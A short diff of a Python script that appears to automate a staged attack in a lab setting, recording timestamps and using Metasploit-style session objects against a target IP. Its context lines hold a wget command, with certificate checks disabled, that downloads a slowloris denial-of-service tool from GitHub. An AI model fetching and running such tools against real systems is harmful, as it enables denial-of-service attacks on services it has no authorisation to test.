@@ -19,19 +19,18 @@ def main(argv):
     target_ip = argv[3]
 
     time.sleep(2)
-    output_time_file = 'time_stage_3_start.txt'
+    output_time_file = 'time_step_6_start.txt'
     record_timestamp(folder, output_time_file)
     time.sleep(2)
 
     download_the_app = 'wget --no-check-certificate https://raw.githubusercontent.com/masjohncook/local_slowloris/master/local_slowloris.py'
     subprocess.run(download_the_app.split(), stdout=subprocess.PIPE)
 
-    while client.jobs.list:
-        time.sleep(1)
-
     # print(client.sessions.list['4'])
-
-
+    time.sleep(10)
+    output_time_file = 'time_step_6_end.txt'
+    record_timestamp(folder, output_time_file)
+    time.sleep(2)
 
 
 main(sys.argv)
